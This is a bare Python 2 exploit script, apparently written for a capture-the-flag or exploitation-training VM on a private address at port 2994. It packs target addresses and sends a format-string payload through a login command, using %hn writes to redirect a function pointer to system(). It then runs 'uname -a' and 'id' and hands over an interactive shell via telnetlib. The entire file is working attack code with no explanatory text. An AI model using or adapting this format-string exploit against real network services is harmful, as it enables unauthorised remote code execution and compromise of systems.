import struct
import socket
import telnetlib

HOST = '172.16.75.129'
PORT = 2994
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def read_until(x):
    input = ''
    while x not in input:
        input += s.recv(1)
    return input

STRN = struct.pack("I", 0x804a1a8) #SYSTEM = 0xb7ecffb0
STRN1 = struct.pack("I", 0x804a1a8+1) #SYSTEM = 0xb7ecffb0
STRN2 = struct.pack("I", 0x804a1a8+2) #SYSTEM = 0xb7ecffb0
STRN3 = struct.pack("I", 0x804a1a8+3) #SYSTEM = 0xb7ecffb0

init_len = 68
count1 = 0xb0 - init_len
count2 = 0xff - 0xb0
count3 = 0x1ec - 0xff
count4 = 0x2b7 - 0x1ec

ip, port = s.getsockname()
hostname = ip + ':' + str(port)

username = 'a'#*(24-len(hostname))
password = 'b' + STRN + STRN1 + STRN2 + STRN3 
password += "%{}x".format(count1) +'%20$hn' 
password += "%{}x".format(count2) +'%21$hn' 
password += "%{}x".format(count3) +'%22$hn' 
password += "%{}x".format(count4) +'%23$hn' 

print read_until('] $ ')
raw_input('waiting.......[Enter]')
s.send('username {}\n'.format(username))
print read_until('] $ ')
raw_input('waiting.......[Enter]')
s.send('login {}\n'.format(password))
print s.recv(1024)
raw_input('waiting.......[Enter]')
s.send('uname -a\n')
print s.recv(1024)
raw_input('waiting.......[Enter]')
s.send('id\n')
print s.recv(1024)
raw_input('waiting.......[Enter]')

t = telnetlib.Telnet()
t.sock = s
t.interact()

